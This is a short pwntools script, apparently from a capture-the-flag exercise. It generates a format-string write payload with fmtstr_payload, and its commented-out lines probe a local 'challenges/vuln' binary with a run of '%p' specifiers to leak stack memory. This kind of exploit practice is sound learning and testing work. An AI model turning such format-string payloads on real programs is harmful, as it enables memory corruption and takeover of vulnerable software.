from pwn import *
print(fmtstr_payload(
                    0 , {0x8989:0x8999}, numbwritten=1
                ))
# sh = process("challenges/vuln")
# context.terminal = "/bin/sh"
# g = gdb.attach(sh)
# sh.sendline("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")
# sh.sendline(" ")
# x= sh.recvall()
# print(x[:-len("Welcome  ")])
# sh.interactive()
